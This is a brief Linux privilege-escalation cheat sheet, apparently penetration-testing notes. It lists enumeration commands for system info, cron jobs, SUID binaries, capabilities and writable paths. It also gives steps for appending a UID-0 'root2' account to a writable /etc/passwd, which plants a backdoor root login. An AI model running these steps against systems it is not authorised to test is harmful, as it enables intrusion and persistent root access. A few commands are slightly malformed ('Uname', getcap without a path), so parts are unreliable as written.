## System info

```cat /etc/issue```

```cat /etc/os-release```

```arch```

### Uname

All

```Uname -a```

Kernel version

```Uname -r```

## Processes

```ps aux```

## Network

**IP and interfaces**

```ifconfig```

```ip a```

**Routing table**

```routel```

**Active connections**

```netstat```

```ss```

## CRON - Scheduled tasks

List all cron jobs 

```ls -lah /etc/cron*```

Display current user's jobs

```crontab -l```

Display sudo jobs

```sudo crontab -l```

Get CRON logs

```cat /var/log/cron.log```

```grep "CRON" /var/log/syslog```

## SetUID

SUID

```find / -perm -u=s -type f 2>/dev/null```

Capabilities

```/usr/sbin/getcap -r 2>/dev/null```

## User trails

```env```

```cat .bashrc```

## /etc/passwd

If writable, can make root account

```ls -lah /etc/passwd```

```
openssl passwd password123!

echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
```

## Writable

Writable config files, if a service config file is writable, can be used to privesc

```
find /etc -writable -type f 2>/dev/null
```

Writable directories

```
find / -writable -type d 2>/dev/null
```

## sudo - superuser stuff

```sudo -l```